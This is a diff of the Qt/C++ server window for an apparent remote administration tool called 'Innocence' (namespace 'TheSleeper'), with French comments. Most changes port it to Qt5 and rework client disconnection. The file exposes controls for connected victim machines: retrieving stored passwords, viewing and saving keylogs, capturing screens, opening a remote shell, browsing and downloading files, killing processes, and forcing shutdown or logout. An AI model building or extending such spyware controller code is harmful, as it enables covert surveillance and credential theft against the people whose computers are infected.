@@ -7,6 +7,9 @@
 using namespace std;
 
 #include <QtGui>
+#include <QtWidgets/QMessageBox>
+#include <QFileDialog>
+
 #include <common/Convert.hpp>
 #include <common/Logger.hpp>
 #include <blaspheme/Blaspheme.hpp>
@@ -17,7 +20,7 @@ using namespace Network;
 #include "ServerWindow.hpp"
 
 namespace TheSleeper
-{    
+{ 
     ServerWindow::ServerWindow(QWidget * parent)
     :QMainWindow(parent)
     {
@@ -41,8 +44,8 @@ namespace TheSleeper
         
         // construction de l'arbre des fichiers distants
         remoteFilesView->setHeaderHidden(true);
-        remoteFilesView->header()->setResizeMode(QHeaderView::Stretch);
-        localFilesView->header()->setResizeMode(QHeaderView::Stretch);
+        remoteFilesView->header()->setSectionResizeMode(QHeaderView::Stretch);
+        localFilesView->header()->setSectionResizeMode(QHeaderView::Stretch);
         
         // construction de l'arbre des fichiers locaux
         localFilesView->setModel(&localFilesModel);
@@ -53,7 +56,7 @@ namespace TheSleeper
         processView->setSelectionMode(QAbstractItemView::SingleSelection);
         processView->setModel(&processModel);
         
-        connectedClientsView->horizontalHeader()->setResizeMode(QHeaderView::Stretch);
+        connectedClientsView->horizontalHeader()->setSectionResizeMode(QHeaderView::Stretch);
         
         // connexions signals / slots pour le panneau de droite
         connect(disconnectButton,     SIGNAL(clicked()), this, SLOT(onDisconnect()));
@@ -98,10 +101,12 @@ namespace TheSleeper
     {
         QMessageBox::aboutQt(this);
     }
+
     void ServerWindow::about()
     {
         QMessageBox::about(this, tr("About Innocence"), tr("Innocence Project, made by Crunch"));
     }
+
     void ServerWindow::createStatusBar()
     {
         connectionStatusLabel = new QLabel(tr(" <font color=\"#FF0000\">Offline </font> "));
@@ -229,38 +234,28 @@ namespace TheSleeper
     {
         // un des clients s'est deconnecte, mais on ne sais pas lequel
         // pour le savoir on n'utilise : QObject::sender()
-        ClientPtr disconnected_client = (ClientPtr) QObject::sender();
+        ClientPtr disconnectedClient = (ClientPtr) QObject::sender();
         
-        LOG << "Le client " + disconnected_client->getIp().toStdString()+":"+disconnected_client->getPort().toStdString()+" s'est deconnecte.";
+        LOG << "Le client " + disconnectedClient->getIp().toStdString()+":"+disconnectedClient->getPort().toStdString()+" s'est deconnecte.";
         
-        ClientPtrList::iterator iter = std::find(clients.begin(), clients.end(), disconnected_client);
+		// on le deconnecte proprement
+        disconnectedClient->disconnect();
+
+        ClientPtrList::iterator iter = std::find(clients.begin(), clients.end(), disconnectedClient);
         if(iter != clients.end())
         {
-            bool must_switch = false;
-            // si par hasard c'est le client en cours, on doit switcher de client
-            if(iter == currentClient)
-            {
-                currentClient = clients.begin();
-                must_switch = true;
-            }
-
-            // on le deconnecte proprement
-            (*iter)->disconnect();
-
-            // on detruit l'objet core
-            delete *iter;
-
             // on enleve le pointeur de la liste grace a l'iterateur
             clients.erase(iter);
             
             // on met a jour le modele
             clientsModel.set(clients);
             
-            if(must_switch)
-            {
-                switchClient();
-            }
+			currentClient = clients.begin();
+            switchClient();
         }
+
+		// on detruit l'objet core
+        delete disconnectedClient;
     }
 	/*
     void ServerWindow::addAuxClient(Network::TcpClient new_stream, Blaspheme::SessionId id_stream)
@@ -323,6 +318,7 @@ namespace TheSleeper
             LOG << "Erreur d'origine inconnue";
         }
     }
+
     void ServerWindow::onChangeClient( const QModelIndex & index)
     {        
         if(current_index == index)
@@ -341,6 +337,7 @@ namespace TheSleeper
             }
         }
     }
+
     void ServerWindow::switchClient()
     {
         LOG << "Switch du client.";        
@@ -366,7 +363,8 @@ namespace TheSleeper
     {
         LOG << "Echec de l'authentification.";
         connectionStatusLabel->setText(tr(" <font color=\"#FF0000\">Bad Password </font> "));
-    } 
+    }
+
     void ServerWindow::configureOptions()
     {
         
@@ -379,6 +377,7 @@ namespace TheSleeper
             (*currentClient)->shutdown();
         }
     }
+
     void ServerWindow::reboot()
     {
         if(currentClient != clients.end())
@@ -386,6 +385,7 @@ namespace TheSleeper
             (*currentClient)->reboot();
         }
     }
+
     void ServerWindow::uninstall()
     {
         if(currentClient != clients.end())
@@ -393,6 +393,7 @@ namespace TheSleeper
             (*currentClient)->uninstall();
         }
     }
+
     void ServerWindow::upgrade()
     {
         if(currentClient != clients.end())
@@ -408,6 +409,7 @@ namespace TheSleeper
             }
         }
     }
+
     void ServerWindow::remoteShutdown()
     {
         if(currentClient != clients.end())
@@ -415,6 +417,7 @@ namespace TheSleeper
             (*currentClient)->remoteShutdown();
         }
     }
+
     void ServerWindow::remoteReboot()
     {
         if(currentClient != clients.end())
@@ -422,6 +425,7 @@ namespace TheSleeper
             (*currentClient)->remoteReboot();
         }
     }
+
     void ServerWindow::remoteHibernate()
     {
         if(currentClient != clients.end())
@@ -429,6 +433,7 @@ namespace TheSleeper
             (*currentClient)->remoteHibernate();
         }
     }
+
     void ServerWindow::remoteLogout()
     {
         if(currentClient != clients.end())
@@ -436,6 +441,7 @@ namespace TheSleeper
             (*currentClient)->remoteLogout();
         }
     }
+
     void ServerWindow::remoteShell()
     {
         if(currentClient != clients.end())
@@ -443,6 +449,7 @@ namespace TheSleeper
             (*currentClient)->remoteShell();
         }
     }
+
     void ServerWindow::getPasswords()
     {
         if(currentClient != clients.end())
@@ -451,6 +458,7 @@ namespace TheSleeper
             passwords_dialog.show();
         }
     }
+
     void ServerWindow::updateProcessList()
     {
         if(currentClient != clients.end())
@@ -459,6 +467,7 @@ namespace TheSleeper
             processModel.setStringList((*currentClient)->getProcessList());
         }
     }
+
     void ServerWindow::killProcess()
     {
         if(currentClient != clients.end())
@@ -475,18 +484,24 @@ namespace TheSleeper
             }
         }
     }
+
     void ServerWindow::updateScreen()
     {
+		updateScreenButton->setEnabled(false);
+        screenProgressBar->setValue(0);
         if(currentClient != clients.end())
         {
-            updateScreenButton->setEnabled(false);
-            screenProgressBar->setValue(0);
-            (*currentClient)->updateScreen((int)jpegQualitySpinBox->value(), screenProgressBar);
+            (*currentClient)->updateScreen((int)jpegQualitySpinBox->value(), screenProgressBar);		
+        }
+
+		if(currentClient != clients.end())
+		{
 			screenLabel->clear();
             screenLabel->setPixmap((*currentClient)->getScreen());
-            updateScreenButton->setEnabled(true);
-        }
+		}
+		updateScreenButton->setEnabled(true);
     }
+
     void ServerWindow::saveScreen()
     {
         const QPixmap * screenmap = screenLabel->pixmap();
@@ -497,6 +512,7 @@ namespace TheSleeper
             screenmap->save(fileName);
         }
     }
+
     void ServerWindow::showKeylog()
     {
         if(currentClient != clients.end())
@@ -508,6 +524,7 @@ namespace TheSleeper
             updateLogButton->setEnabled(true);
         }
     }
+
     void ServerWindow::saveKeylog()
     {
         if(keylogEdit->toPlainText().toStdString().size())
@@ -522,6 +539,7 @@ namespace TheSleeper
             }
         }
     }
+
     void ServerWindow::browseRemoteFiles(QModelIndex index)
     {
         if(currentClient != clients.end())
@@ -532,6 +550,7 @@ namespace TheSleeper
             }
         }
     }
+
     void ServerWindow::startDownload()
     {
         if(currentClient != clients.end())
